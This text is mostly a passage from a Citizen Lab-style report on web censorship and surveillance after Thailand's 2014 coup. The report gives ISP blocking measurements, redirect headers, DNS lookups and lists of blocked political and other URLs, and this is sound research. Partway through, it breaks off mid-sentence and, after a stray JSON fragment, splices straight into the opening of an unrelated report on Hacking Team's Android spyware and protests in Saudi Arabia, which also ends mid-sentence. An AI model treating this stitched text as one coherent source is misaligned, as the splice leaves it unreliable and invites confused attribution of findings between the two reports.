Thaksin to return to Thailand while avoiding criminal charges. Widespread opposition rallies ensued led by the Democrat Party, who banded together anti-government groups under the new alliance, the People’s Democratic Reform Committee (PDRC). Day after day they occupied major intersections of Bangkok, paralyzing Thailand’s capital city. With no end in sight to the conflict, the government dissolved parliament and called for a snap election to break the stalemate.\nThe gamble did not pay off as the Democrats boycotted the election and mobilized their PDRC supporters to ban voting, resulting in many electoral irregularities. The Constitutional Court subsequently annulled the election results and, on May 8, 2014, impeached Yingluck on the charge of abuse of power, which set the government into a complete tailspin. On May 20, martial law was declared and the military, citing the need to restore order and stability, formally took over two days later.\nSince the coup occurred, the military-run National Council for Peace and Order (NCPO) has summoned and arrested hundreds of opposition politicians, journalists,  activists and academics, imposed a curfew and banned public gatherings of five or more people, and deployed thousands of troops to Bangkok to prevent the spread of protests. In a nationally televised speech, NCPO leader General Prayuth Chan-ocha suggested that it could take more than a year for the junta to implement sufficient reforms to permit an election and a return to civilian rule. The Internet played a key role in the coup and its aftermath. Aside from being broadcast on television, the martial law declaration was also announced through the military’s Twitter account, and Facebook page. Subsequently, measures to restrict the free flow of information on the Internet were implemented, as the military junta has sought to limit the spread of anti-coup messages and increase surveillance of citizens’ anti-coup activities.\nPirongrong Ramasoota, outlines [PDF] in Access Contested: Security, Identity, and Resistance in Asian Cyberspace, that shifts in Thailand’s political landscape have had a history of also impacting the Internet regulatory landscape. For instance, following the September 2006 military coup which overthrew the longest-ruling civilian administration in modern Thai history, the government passed the Computer Crime Act 2007, which has been criticized for its negative impact on freedom of expression on the Internet since it came into force in July 2007.\nInformation controls in Thailand\nDefining information controls\nWe conceive of information controls as actions conducted in or through information and communications technologies (ICTs), which seek to deny (such as web filtering), disrupt (such as denial-of-service attacks), shape (such as throttling), secure (such as through encryption or circumvention) or monitor (such as passive or targeted surveillance) information for political ends. Information controls can also be non-technical and can be implemented through legal and regulatory frameworks, including informal pressures placed on private companies. Information controls are generic in terms of underlying values, reflecting a range of motivations, and can include efforts undertaken to open up access to information or secure privacy as much as efforts undertaken to do the opposite.\nInformation controls can be applied in highly dynamic ways that respond to events on the ground. Significant political events such as elections, protests, or conflicts, are important sites of contestation around information controls and include multiple actors, such as states, private companies, criminal or militant organizations, and civil society. It is during these time periods that information has its highest value, and as a result, is the most contested. The 2014 Thailand coup reflects this trend.\nInternet Filtering in Thailand\nIn Thailand, a number of entities are involved in regulating the Internet. The Ministry for Information and Communications Technology (MICT) is responsible for general oversight of ICT policy and development, while the National Broadcasting and Telecommunications Commission (NBTC) regulates, amongst other things, licenses for Internet service and the international Internet gateways.\nAlthough Internet filtering was first introduced in 2002 by a unit of the MICT, information controls were not legislated until the arrival of the Computer Crime Act 2007. Since the Act’s introduction, court orders to block Internet content has increased from 2 URLs in 2007 to over 74,000 in 2012. Examples of content targeted for filtering include pornography, gambling, and terrorism. The government also often invokes lèse-majesté, defined as acts which insult or defame the king or the royal family, as a rationale for the blocking of online content. In 2012, Chiranuch Premchaiporn, the webmaster of popular news portal Prachatai, was given an eight-month suspended sentence for failing to promptly remove user comments deemed insulting to the monarchy.\nOur prior research into information controls in Thailand has shown that the implementation of filtering is highly inconsistent among the country’s ISPs.\nIn 2007 we tested a sample of 1,700 URLs on three ISPs: KSC, LoXinfo, and True. Results found 34 URLs blocked on KSC, 68 URLs on LoXinfo, and 62 URLs on True. Filtering of our test sample on these ISPs primarily focused on content related to pornography, online gambling websites, and circumvention tools. Websites found blocked varied between the three ISPs. LoxInfo and True showed significant overlap in websites filtered. However, only KSC filtered content related to lèse majesté, blocking a number of pages on Amazon.com and other commerce websites featuring censored biographies of the King.\nTesting conducted in 2010, following the declaration of a “State of Emergency” after anti-government Red Shirt protesters overran parliament, found that many political opposition sites had been blocked, particularly those related to the Red Shirts. However, like the 2007 results, this filtering was inconsistently applied across ISPs. Out of 36 websites targeted by a post-state of emergency leaked government mandated blocklist, True and TOT blocked 10 and 23 URLs, respectively.\nThese previous results show that Internet filtering is inconsistently implemented across ISPs and government ordered blocked lists are not uniformly followed.\nInformation controls and the 2014 coup\nOn May 20, 2014, the day martial law was declared, the army issued an order suspending normal programming of all television and radio stations and forced them to air military-approved news only. The NCPO also ordered Thai and foreign media not to interview any academics for opinion on the political situation.\nOn May 21, the NCPO created a working group tasked with coordinating efforts to censor the Internet. This working group consisted of representatives from the MICT, the National Broadcasting and Telecommunications Commission (NBTC) and the army’s “peacekeeping” unit, called the Peace and Order Maintaining Command (POMC). The unit was headed by Pisit Paoin, previously the head of the Thai police’s Technology Crime Suppression (TCSD) division.\nOn May 22, the day the coup was launched, the junta started exerting pressure on different stakeholder groups and taking further steps to restrict the spread of anti-coup sentiment.\nISPs and telecommunication companies\nA military order was released the same day as the coup occurred, which called on ISPs to monitor and deter the publication of information online which may incite unrest in the country. The censorship working group announced that, after meeting with 105 local ISPs, it had blocked six “inappropriate” websites with the cooperation of True Corporation, the country’s largest ISP. Following this meeting, it was also announced that the POMC would summon representatives from major social media services in the country, including Facebook, Twitter, YouTube and LINE, to discuss “cooperation” on this issue.\nReports of Internet filtering continued to increase and, on May 24, an MICT representative told the media that the Ministry’s Cyber Security Operation Center (CSOC) had blocked over 100 URLs since the imposition of martial law, although no details were released. On May 27, the MICT announced this number had increased to 219 URLs. Two days later, the NBTC released details on some of the websites targeted for blocking, which included Red Shirt websites and Twitter accounts, an anti-coup Facebook page, and YouTube videos which contravened lèse-majesté regulations.\nSocial media\nSocial media is widely used in Thailand. Bangkok has more Facebook users than any other city in the world and Siam Paragon, a shopping mall in Bangkok, is the most Instagrammed location on earth.\nThe first blocking of a social media platform occurred on the afternoon of May 28, when Facebook was reported to be inaccessible for approximately one hour. The outage was initially blamed on technical issues at the country’s gateway, however,  Surachai Srisaracam, permanent secretary of the Information and Communications Technology Ministry, later told media that the action was intended to stop the spread of anti-coup messages. A representative from Norwegian telecom firm Telenor, the majority shareholder of DTAC, the country’s second largest GSM mobile phone provider, later confirmed that the NBTC had ordered access to Facebook restricted. This disclosure led to strong criticism from NTBC, who called the comments “disrespectful” and threatened to stringently investigate DTAC’s shareholding. Telenor would later apologize for publicly disclosing this sensitive information, however they did not suggest it was inaccurate.\nFacebook’s shutdown occurred one day before a scheduled meeting between representatives from the military junta and those from social media platforms such as Twitter, Google, and Instagram. That meeting, however, didn’t materialize as the invited companies failed to show up. A scheduled trip to Singapore and Japan to meet with Facebook, Google, and messaging app LINE was also called off after it was deemed unnecessary.\nIn early June, Thai police warned users that showing support for anti-coup activities by liking a social media post constituted a crime, punishable by up to five years in jail. Soon after, charges were filed against former Education Minister Chaturon Chaisang for his anti-coup statements on Facebook, and in addition, he faces charges of sedition for delivering an anti-coup speech.\nProminent democracy activist Sombat Boonngamanong, also known as Nuling, was arrested by Thai police on June 5 for failing to appear after being summoned by police. Reports emerged that Nuling was located after the IP address of his computer was tracked by Thai intelligence services, who were monitoring his Facebook posts.  Nuling had changed his Facebook and Twitter accounts to display the message “Catch Me If You Can”, leading TCSD head Pisit Paoin to respond,  “Now we are showing him. We can catch you”.\nThai police have offered rewards of up to 500 baht for pictures of individuals taking part in anti-coup activities, including those from social media, and set up institutions to monitor different types of media for information which shows “hatred towards monarchy”. Broadcast media is monitored by NBTC as the state regulator, print media is monitored by a Special Branch of the Thai Police, online media is monitored by MICT, and foreign media is monitored by the Foreign Ministry.\nThe junta has also adopted phishing techniques using a Facebook application to collect information on their citizens. After the coup, Thai Netizen Network, a digital rights group, noticed that the TCSD-maintained page that appears when netizens try to access certain blocked websites had a “Login with Facebook” icon. Users were then asked for permission to hand over information stored in their Facebook profile, without any indication, in Thai or English, as to where or for what purpose that data was being sent. EFF reported that the “Login” app was being run by TCSD itself, which used the Facebook app to collect personal details of Facebook users visiting the page.\nChat apps\nLINE, a mobile messaging application, developed by Japan-based LINE Corporation, is extremely popular in Thailand. The country has the most LINE users of any market outside of Japan, with 61.1 percent of social media users said to be using the application. Reports indicated that the use of mobile phones spiked soon after the coup, as they provided a way for people to seek and impart information, and therefore, it was unsurprising that the junta thought to use it as a means to surveil their citizens.\nThe LINE app was singled out by the working group as a tool for surveillance, with working group head Pisit Paoin stating:\n“We’ll send you a friend request. If you accept the friend request, we’ll see if anyone disseminates information which violates the National Council for Peace and Order (NCPO) orders. Be careful, we’ll soon be your friend.”\nIt is important to note, however, that efforts to monitor mobile messaging applications did not begin with the coup. The TCSD announced plans in August 2013 to monitor conversations on apps such as LINE and WhatsApp to “safeguard the order, security and morality of Thailand”.\nNetwork Measurements of Web Filtering\nFrom May 22 to June 26, 2014, we conducted network tests consisting of HTTP GET requests, traceroutes, and packet captures using client-based measurements, virtual private networks (VPNs), and proxies on the following Internet service providers (ISPs): 3BB (client-based and proxy-based tests) INET (VPN-based tests), ServeNet (VPN-based tests), CAT (Proxy-based tests) and TOT (proxy-based tests).\nOur results are grouped below by the specific network vantage point used.\nVPN Test Results\nVirtual Private Networks (VPN) are a mechanism that allows users to connect to remote networks.  We use these services to give us vantage points into Thailand based networks remotely and to observe whether or not filtering is occurring and to which extent.  We tested website accessibility via two Thailand based VPNs on the ISPs INET and Servenet.\nData was collected by performing synchronized HTTP requests from the VPN vantage point and from a lab location (at the University of Toronto) using measurement software written in Python. The lab network acts as a control.\nDuring tests the client attempts to access a pre-defined list of URLs simultaneously via the VPN (the “field”)  and in a control network (the “lab”). Tests were conducted on URL lists that consisted of locally sensitive URLs that are specific to Thailand’s social, political, and cultural context.\nA number of data points are collected for each URL access attempt: HTTP headers and status code, IP address, page body, traceroutes and packet captures. A combined process of automated and manual analysis attempts to identify differences in the results returned between the field and the lab to isolate instances of filtering.\nAs reports of blocking emerged from the country during the testing period, the list of URLs tested varied slightly over the course of testing to include URLs reported to be blocked. In total, 433 URLs were tested on both VPNs. In a small number of tests, a larger list of internationally relevant content was tested to confirm the breadth and depth of filtering.\nINET Results\nTests were conducted on INET between May 22 and June 24, 2014. Test results show that the implementation of blocking has been highly dynamic since the start of the coup. VPN tests run from May 22 until early on May 27, relative to Eastern Standard Time, showed no evidence of blocking.\nThe first evidence of blocked URLs occurred on the afternoon of May 27, when attempts to access blocked content resulted in the following blockpage:\nFigure 1: Blockpage first seen on May 28\nBlocking was implemented by a transparent HTTP proxy which injected a 302 redirection, as seen in the response headers to a request for a blocked URL:\nHTTP/1.0 302 Moved Temporary Location:  http://kkk.home.dyndns.org Connection: close Content-type: text/plain\nThe IP address associated with this domain is 203.113.10.181:\nFigure 2: Geolocation information for blockpage IP (Source: http://iplocation.net)\nThese results show that the blockpage is hosted in Thailand on the ISP TOT, despite the use of dynamic domain provider Dyn for their domain name (kkk.home.dyndns.org).\nThis is somewhat unusual, as in most cases transparent blockpages are not hosted on such domains. Dynamic domains are most often used by individual users who change IPs frequently and are not often used by large telecommunication companies. Most ISPs have a supply of static IPs as well as the resources and knowledge to register regular domains themselves. One possible explanation is that the ISP wanted to obfuscate who was responsible for blocking the content, although this is not certain.\nOn June 2nd, a new blockpage was seen when accessing blocked content:\nFigure 3: Blockpage first seen on June 2.\nHosting of this blockpage changed from kkk.home.dyndns.org to block.dyndns-at-home.com, also hosted on TOT and again using a dynamic domain by Dyn:\n$ dig block.dyndns-at-home.com block.dyndns-at-home.com. 59 IN A 203.113.26.210\nAutonomous system number (ASN) which denotes which organization is responsible for the IP address is as follows:\n\n\n\nAS\nISP\nAS Name\n\n\n9739\n203.113.26.210\nTOTNET-TH-AS-AP TOT Public Company Limited,TH\n\n\n\n \nOn June 3, the hosting of the blockpage changed to http://blocked.ict-cop.com, which is hosted in Chicago on a U.S.-based hosting provider:\n$ dig blocked.ict-cop.com blocked.ict-cop.com. 13148 IN A 216.36.238.43\nASN information and geolocation information for this IP address:\n\n\n\nAS\nISP\nAS Name\n\n\n20401\n216.36.238.43\nHOSTWAY-1 – Hostway Corporation,US\n\n\n\nFigure 4: Geolocation information for the blockpage IP (Source: http://iplocation.net)\nOn June 9, 2014, the injected 302 redirection again changed location:\nHTTP/1.0 302 Moved Temporary Location: http://203.113.26.210 Connection: close Content-type: text/plain\nThe IP address, 203.113.26.210, is again hosted on the ISP TOT:\n\n\n\nAS\nISP\nAS Name\n\n\n9739\n203.113.26.210\nTOTNET-TH-AS-AP TOT Public Company Limited,TH\n\n\n\nThe IP address is the same address as we have seen previously for the domain block.dyndns-at-home.com although the blockpage is no longer using a domain name. The blockpage seen is the same as seen above in Figure 3. These changes in blockpage hosting are summarized below:\n \n\n\n\nDate\nInformation\nDomain\nIP\nHosting Country\nHosting Network\n\n\nMay 22nd – May 27th\nBlocking Not Observed\n\n\n\n\n\n\nMay 27th\nBlocking Observed\nhttp://kkk.home.dyndns.org\n203.113.10.181\nThailand\nTOT Content Farm Network\n\n\nJune 2nd\nBlocking Observed\nhttp://block.dyndns-at-home.com\n203.113.26.210\nThailand\nTOT Public Company Limited\n\n\nJune 3rd\nBlocking Observed\nhttp://blocked.ict-cop.com\n216.36.238.43\nUSA\nHostway Corporation\n\n\nJune 9th\nBlocking Observed\n\n203.113.26.210\nThailand\nTOT Public Company Limited\n\n\n\n \nThroughout the course of testing, a total of 56 URLs were found to be blocked:\n \n\n\n\nURL\nContent Category\n\n\nhttp://adultfriendfinder.com\nOnline Dating\n\n\nhttp://anonymouse.org\nAnonymizers and Censorship Circumvention\n\n\nhttp://downmerng.blogspot.com\nPolitical Reform\n\n\nhttp://ibcbet.com\nGambling\n\n\nhttp://redsiam.wordpress.com\nFreedom of Expression and Media Freedom\n\n\nhttp://thaienews.blogspot.com\nFreedom of Expression and Media Freedom\n\n\nhttp://uddtoday.ning.com\nFreedom of Expression and Media Freedom\n\n\nhttp://weareallhuman.info\nFreedom of Expression and Media Freedom\n\n\nhttp://weareallhuman2.info\nFreedom of Expression and Media Freedom\n\n\nhttp://www.89.com\nPornography\n\n\nhttp://www.bloggang.com\nGroups & social networking\n\n\nhttp://www.casinotropez.com\nGambling\n\n\nhttp://www.dangsiam.com\nMisc\n\n\nhttp://www.enlightened-jurists.com\nHuman Rights\n\n\nhttp://www.europacasino.com\nGambling\n\n\nhttp://www.famouspornstars.com\nPornography\n\n\nhttp://www.fuckingfreemovies.com\nPornography\n\n\nhttp://www.konthaiuk.com\nPolitical Reform\n\n\nhttp://www.konthaiuk.com/forum/\nPolitical Reform\n\n\nhttp://www.konthaiuk.com/home.php\nPolitical Reform\n\n\nhttp://www.ladbrokes.com\nGambling\n\n\nhttp://www.midnightuniv.org\nFreedom of Expression and Media Freedom\n\n\nhttp://www.naughty.com\nPornography\n\n\nhttp://www.penisbot.com\nPornography\n\n\nhttp://www.persiankitty.com\nPornography\n\n\nhttp://www.prachatai.com\nFreedom of Expression and Media Freedom\n\n\nhttp://www.redadhoc.org\nPolitical Reform\n\n\nhttp://www.riverbelle.com\nGambling\n\n\nhttp://www.spinpalace.com\nGambling\n\n\nhttp://www.tfn3.info/board/\nFreedom of Expression and Media Freedom\n\n\nhttp://www.thaichix.com\nPornography\n\n\nhttp://www.thaigirls100.net\nPornography\n\n\nhttp://www.thailandtorrent.com\nPeer-to-peer file sharing\n\n\nhttp://www.thaingo.org\nFreedom of Expression and Media Freedom\n\n\nhttp://www.wetplace.com\nPornography\n\n\nhttp://www.worldsex.com\nPornography\n\n\nhttp://www.youngerbabes.com\nPornography\n\n\nhttp://www.youtube.com/user/prachatai\nFreedom of Expression and Media Freedom\n\n\nhttp://hidemyass.com\nAnonymization and Circumvention\n\n\nhttp://xvideos.com\nPornography\n\n\nhttp://beeg.com\nPornography\n\n\nhttp://ultrasurf.us\nAnonymization and Circumvention\n\n\nhttp://www.dailymail.co.uk\nFreedom of Expression and Media Freedom\n\n\nhttp://www.sportsinteraction.com\nGambling\n\n\nhttp://www.betfair.com\nGambling\n\n\nhttp://www.facebook.com/groups/264574313594382/\nPolitical Reform\n\n\nhttp://www.dailymail.co.uk/home/index.html\nFreedom of Expression and Media Freedom\n\n\nhttp://www.dailymail.co.uk/news/article-2638352/how-future-queen-thailand-wearing-tiny-g-string-let-poodle-foo-foo-eat-cake-as-coup-rocks-bangkok-video-reveals-royal-couples-decadent-lifestyle.html\nFreedom of Expression and Media Freedom\n\n\nhttp://www.facebook.com/pages/no-coup-thailand/234144303452067\nPolitical Reform\n\n\nhttp://uddtoday.net\nPolitical Reform\n\n\nhttp://www.uddtoday.net\nPolitical Reform\n\n\nhttp://www.facebook.com/nuling\nFreedom of Expression and Media Freedom\n\n\nhttp://www.facebook.com/2yes2no\nPolitical Reform\n\n\nhttp://www.uddtoday.net/video/redaksa\nFreedom of Expression and Media Freedom\n\n\nhttp://twitter.com/nuling\nPolitical Reform\n\n\nhttp://www.theguardian.com/world/2014/jun/09/standing-up-thai-military-coup\nFreedom of Expression and Media Freedom\n\n\n\n \nBlocked URLs fell into a number of content categories, including freedom of expression/media freedom, political reform, pornography, anonymization/circumvention tools and gambling. Some notable websites dealing with critical political content or independent media were blocked, including Prachatai (http://www.prachatai.com), Daily Mail (http://www.dailymail.co.uk), and websites belonging to the United Front for Democracy (UDD) (http://www.uddtoday.net).\nA number of Facebook pages were blocked, including that of a group called No Coup Thailand (http://www.facebook.com/pages/no-coup-thailand/234144303452067) and 2 Yes 2 No (http://www.facebook.com/2yes2no).\nWebsites associated with recently arrested activists and journalists were also found to be blocked. Pro-democracy activist Sombat Boonngamanong (aka Nuling), who was arrested June 5, had his Facebook page  (http://www.facebook.com/nuling) blocked, while the website of the legal scholars group Enlightened Jurists (http://www.enlightened-jurists.com), whose members Sawatree Suksri and Worachet Pakeerut were summoned by the junta, was also found to be blocked.\nServenet Results\nTests were conducted on Servenet between June 5 and June 26, 2014.  Servenet is a data center and VPS provider and not a traditional ISP, however test results demonstrated that it is also affected by the filtering regime. Tests run on this ISP via VPN similarly showed variability in the implementation of filtering.\nThe first test was run on June 5, 2014, and showed evidence of blocking by redirection to blocked.ict-cop.com, as seen on INET. However by June 7, blocking was implemented in a similar manner to that seen on INET. Attempts to access blocked content were redirected to the IP 203.113.26.210, as seen in the following server response headers when accessing a blocked URL:\nHTTP/1.0 302 Moved Temporary Location: http://203.113.26.210/ Connection: close Content-type: text/plain\nThis IP address, 203.113.26.210, is hosted on the ISP TOT:\n\n\n\nAS\nISP\nAS Name\n\n\n9739\n203.113.26.210\nTOTNET-TH-AS-AP TOT Public Company Limited,TH\n\n\n\n \nThis redirection leads to the same blockpage seen on INET, as shown in Figure 3 above.

This data was collected using the same method as described in the VPN test results section. Tests were conducted on the ISP 3BB on June 25, 2014. A total of 433 URLs were tested during this period. 33 of these URLs were found to be blocked through three different methods: The first blocking method on this ISP is through the use of a transparent proxy which injected a 302 redirection to 203.113.26.210, as seen here in this HTTP request/response pair:\nGET /asia/thailand HTTP/1.1 Accept-Encoding: identity Host: www.hrw.org Connection: close User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1)HTTP/1.0 302 Moved Temporary Location: http://203.113.26.210 Connection: close Content-type: text/plain\nThis IP address is hosted on the ISP TOT:\n\n\n\nAS\nISP\nAS Name\n\n\n9739\n203.113.26.210\nTOTNET-TH-AS-AP TOT Public Company Limited,TH\n\n\n\nThe redirection leads to the same blockpage seen on INET, shown above in Figure 3. This blockpage has the following HTML source:\n\n<html>\r\n   <head></head>\r\n       <body>\r\n             <center> <img src = \"ict2.jpg\"> </center>       \r\n       </body>\r\n</html>\r\n\n\n \nThe following 20 URLs were found blocked through this method:\n \n\n\n\nURL\nContent Category\n\n\nhttp://redsiam.wordpress.com\nFreedom of Expression and Media Freedom\n\n\nhttp://thaienews.blogspot.com\nFreedom of Expression and Media Freedom\n\n\nhttp://www.dangsiam.com\nMisc\n\n\nhttp://www.enlightened-jurists.com\nHuman Rights\n\n\nhttp://www.konthaiuk.com\nPolitical Reform\n\n\nhttp://www.konthaiuk.com/forum/\nPolitical Reform\n\n\nhttp://www.konthaiuk.com/home.php\nPolitical Reform\n\n\nhttp://www.midnightuniv.org\nFreedom of Expression and Media Freedom\n\n\nhttp://www.facebook.com/groups/264574313594382/\nPolitical Reform\n\n\nhttp://www.facebook.com/reddemocracy?ref=profile\nPolitical Reform\n\n\nhttp://www.dailymail.co.uk/home/index.html\nFreedom of Expression and Media Freedom\n\n\nhttp://www.facebook.com/pages/no-coup-thailand/234144303452067\nPolitical Reform\n\n\nhttp://uddtoday.net\nPolitical Reform\n\n\nhttp://www.uddtoday.net\nPolitical Reform\n\n\nhttp://www.facebook.com/nuling\nFreedom of Expression and Media Freedom\n\n\nhttp://www.facebook.com/2yes2no\nPolitical Reform\n\n\nhttp://www.uddtoday.net/video/redaksa\nFreedom of Expression and Media Freedom\n\n\nhttp://twitter.com/nuling\nPolitical Reform\n\n\nhttp://www.theguardian.com/world/2014/jun/09/standing-up-thai-military-coup\nFreedom of Expression and Media Freedom\n\n\nhttp://www.hrw.org/asia/thailand\nHuman Rights\n\n\n\n \nThe second method was also through a transparent proxy which returns the following blockpage text:\n“ขออภัยในความไม่สะดวก กระทรวงเทคโนโลยีสารสนเทศและการสื่อสาร ได้มีคำสั่งให้ระงับการเผยแพร่เว็บไซด์ที่ท่านต้องการเข้าชม เนื่องจากมีรูปภาพ ข้อความ และ เนื้อหาบางส่วนที่ไม่เหมาะสม สอบถามรายละเอียดเพิ่มเติมได้ที่ กระทรวงเทคโนโลยีสารสนเทศและการสื่อสาร โทร 0 2141 6950”…\n \nWhich translates to:\n“Sorry for the inconvenience.

The following five URLs were found blocked through this method:\n\n\n\nURL\nContent Category\n\n\nhttp://ibcbet.com\nGambling\n\n\nhttp://www.gboysiam.com\nGay and Lesbian – no pornography\n\n\nhttp://www.thailandtorrent.com\nPeer-to-peer file sharing\n\n\nhttp://sportsbook.sportdafa.com/th\nGambling\n\n\nhttp://www.188bet.com\nGambling\n\n\n\n \nIt is unclear why we see three separate implementations of blocking on this ISP. The first blockpage, shown in Figure 3, appears to have been introduced after the coup, and the content found blocked through this method is generally critical of the coup. The second and third methods showed a broader variety of content blocked and are likely methods of blocking introduced before the coup.\nProxy Test Results\nTests were conducted via a number of publicly accessible web proxies located in Thailand. The primary purpose of this testing was to determine how the implementation of filtering varied between ISPs, and to permit testing on ISPs for which we did not otherwise have visibility into. We used proxy vantage points to test access to a sample of four URLs from May 29th to June 4, 2014. These four URLS were all found blocked through VPN and client-based testing on other ISPs:\n\nhttp://www.tfn3.info/board/\nhttp://www.enlightened-jurists.com\nhttp://www.ibcbet.com\nhttp://www.youtube.com/user/prachatai\n\nThese tests of this small sample of URLS showed that these URLs were blocked consistently across ISPs, with only two instances of one of the above URLs found to be accessible. More comprehensive testing on these ISPs would be required to determine how consistent filtering was across a larger testing list.\nCAT Telecom\nAttempts to access URLs #1, 3, and 4 on May 29, 2014, on a proxy based on the ISP CAT Telecom redirected to a blockpage hosted at http://w3.mict.go.th/blocked.html, although the blockpage did not load successfully. By June 3rd, tests of URL #1 on this same proxy displayed the blockpage seen above in Figure 3.\n3BB\nAttempts to access URL #3 on May 29, 2014 on a proxy on the ISP 3BB displayed the following blockpage:\nFigure 5: Blockpage seen on 3BB via proxy testing when attempting to access ibcbet.com\n \nThis blockpage text translates to:\n“Sorry for the inconvenience Access to such information Temporarily suspended The police HQ Royal Thai Police For more information, Crime Suppression Division technologies. Police HQ Police call 02-143-8447 “\nOn May 30th, tests of URL #2 on a proxy on the ISP 3BB displayed the following blockpage:\nFigure 6: Blockpage seen on 3BB via proxy testing when attempting to access enlightened-jurists.com\nThis blockpage text translates to:\n“Temporarily closed Division orders, maintain order “\nTOT\nAttempts to access URLs #3 and 4 on May 29th on a proxy on the ISP TOT displayed the same blockpage seen on INET in Figure 1. Attempts to access URL #1 on May 30, 2014, on a proxy hosted on the ISP TOT displayed the same blockpage seen on INET in Figure 3. These results demonstrate that while most content from this small sample was blocked on the ISPs tested, blocking was both implemented differently and was highly dynamic during the early days of the coup.\nConclusion\nAfter the 2006 Thai coup, the government engaged in a crackdown on activists, increased filtering of websites, and implemented new laws governing online content, thus altering the landscape of information controls. The weeks following the 2014 coup have shown a similar dynamic, as the government seeks to erect new forms of information control in response to the crisis. Whether and to what extent these information controls affect the ICT landscape in Thailand in years to come remains to be seen. In this report, we have focused our attention primarily on information controls exercised by the state. However, events, such as coups, are multi-faceted and dynamic, and the contests over the information and communications environment will include citizens and private companies who will play a role in shaping the ICT environment in Thailand in the weeks and months ahead. The Citizen Lab will continue to monitor developments in Thailand and report new findings as they become available.\nData\nA complete list of URLs tested and URLs found blocked, for each ISP test, can be found here.\nA collection of blockpages identified during this testing can be found here.\nAcknowledgements\nAdam Senft, Jakub Dalek, Irene Poetranto, Masashi Crete-Nishihata, and Aim Sinpeng undertook research and writing of this report, supported by the Social Sciences and Humanities Research Council (Canada) Grant 430-2014-00183, Prof. Ronald J.

    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU\nAuthors:\nMorgan Marquis-Boire, John Scott-Railton, Claudio Guarnieri, and Katie Kleemola\nFor media coverage of this report, see The Economist,  Associated Press, Wired, VICE, International Business Times, Forbes, Ars Technica, Kaspersky’s Threatpost, Slash Gear, Engadget, Help Net Security, The Verge, CIO Today, Voice of America (VOA), Computer World, Infosecurity Magazine, and Slate.\nRead the Arabic Version  / النسخة العربية  translated by Cyber Arabs\n \nThe left newspapers might whine a bit\nBut the guys at the station they don’t give a shit\nDispatch calls “Are you doin’ something wicked?”\n“No siree, Jack, we’re just givin’ tickets”\nPolice Truck, Dead Kennedys (1980)\n \nSummary\n\nIn Part 1, we analyze a newly discovered Android implant that we attribute to Hacking Team and highlight the political subtext of the bait content and attack context.\nIn Part 2, we expose the functionality and architecture of Hacking Team’s Remote Control System (RCS) and operator tradecraft in never-before published detail.\n\nIntroduction\nThis report analyzes Hacking Team’s Android implant, and uses new documents to illustrate how their Remote Control System (RCS) interception product works. This work builds on our previous research into the technologies and companies behind “lawful interception” malware.  This technology is marketed as filling a gap between passive interception (such as network monitoring) and physical searches.  In essence, it is malware sold to governments.  Unlike phone monitoring and physical searches, however, most countries have few legal guidelines and oversight for the use of this new power.  In light of the absence of guidelines and oversight, together with its clandestine nature, this technology is uniquely vulnerable to misuse. By analysing the tools, and their proliferation at the hands of companies like Hacking Team and Gamma Group, we hope to support efforts to ensure that these tools are used in an accountable way, and not to violate basic principles of human rights and rule of law.\nIn a report published earlier this year, we presented the results of a global scanning effort, and identified 21 countries with deployments of Hacking Team’s Remote Control System monitoring solution. In addition, alongside other researchers, we have uncovered a range of cases where “lawful interception” software has been used against political targets by repressive regimes. Political and civil society targets have included Mamfakinch in Morocco, human rights activist Ahmed Mansoor in the UAE, and ESAT, a US-based news service focusing on Ethiopia. In all of these cases, a tool marketed for “law enforcement” was used against political, rather than security threats.  In still other cases, like Malaysia [PDF], we have found bait documents and seeding suggestive of political targeting.\n\n\nPart 1: An Android Hacking Team Backdoor in Saudi Arabia\nProtests in Saudi Arabia and Qatif\nWhile Saudi Arabia has not seen protests comparable to those elsewhere during the Arab Spring, it has experienced protests since 2011, primarily in the Ash-Sharqīyah province.  There are a number of reasons for political tensions, ranging from demographic pressures, cost of housing, and unemployment, to issues of women’s and minority rights. The province is predominantly Shia, who have long-standing grievances over perceived political and cultural marginalization by the Sunni ruling regime. These grievances were magnified when, in early 2011, the Bahraini government violently suppressed Shia protests with the assistance of Saudi Arabian troops.\nProtests then spread in a number of areas, including in the predominantly Shia Qatif Governorate. In 2011, Shia most protesters appear to have initially demanded reform, rather than the regime-change advocated in other Arab countries.  Interestingly, Qatif has a history of Shia protest, most famously in widespread protests in 1979.  In response to the protests, which demanded greater political and economic participation, the regime provided extensive economic concessions.  In 2011, however, authorities responded with violence and arrests of prominent Shia figures. Protesters were wounded and others allegedly killed by security forces, according to Human Rights Watch.  This crackdown may have contributed to shifting protesters’ demands; today, some explicitly demand regime change using secular language, according to researchers and journalists directly familiar with recent developments who spoke with us.  In what might be described as an inflammatory response, Saudi authorities also arrested an outspoken and highly visible Shia Sheikh.\n“… the prosecutor demanded he face not only the death sentence, but an additional punishment mandated by sharia law for the most heinous offences in which the dead body is defiled by being hanged from a pole.” –Reuters\nThe escalation, which has been accompanied by violence against security services among some Shia, is used by the regime to justify harsh measures, including “riot control,” arrests, and sentences including death for protesters on charges of “Sedition.”  Others have been charged with espionage on behalf of Iran, in a case that has been claimed by many Shia to have been politically motivated.\nHuman rights organizations that have catalogued alleged abuses, like the Adala Center for Human Rights, have been denied the ability to register as formal organizations, subject to URL blocking, and had staff harassed and imprisoned. Journalists attempting to report on Qatif are blocked from entering, and regularly subjected to threats and government pressure.\nSocial media and mobile phones are a key part of how protests are organized, with protesters taking measures, like using pseudonymous accounts, to share their message.  Nevertheless, according to people familiar with the events, digital operational security practices are often piecemeal, and do not match the capabilities of the security services.\nSurveillance, Monitoring and Information Control in Saudi Arabia\nSaudi Arabia is a unique and complex security environment, and its security services play a range of roles.  On the one hand, Saudi Arabia faces undeniable foreign and domestic security threats from hostile groups, extremists and other governments. On the other hand, the regime has been exceptionally aggressive in its attempts to control and stifle dissent and political pluralism.\nThe security services in Saudi Arabia make use of a range of instruments of formal and informal state power to control the electronic information environment in the country.  Beginning at government-maintained Internet chokepoints and extending to ISPs, the state blocks a wide range of political, religious and cultural content.  This includes social media, whether specific users or whole platforms.  Extending further, the state requires that news websites (defined broadly) register with the authorities.  Registered websites are subject to extensive regulation, while unregistered operators that have not registered risk severe penalties.  Site operators are encouraged to self-monitor and moderate content, under threat of financial penalties, jail time, and corporal punishment like lashes.  In addition, anti-cybercrime legislation has also been used to prosecute online dialogue that most societies would consider acceptable political speech.\nThe public use of mobile monitoring extends into forms of social control that many societies would find highly objectionable.  For example, the government earned international condemnation when it announced that it would implement a system to enable their male guardian to monitor the travel behavior of women under their care.  Replacing an older permission-slip based system (“yellow cards”), male guardians receive text messages when women arrive on the premises of the 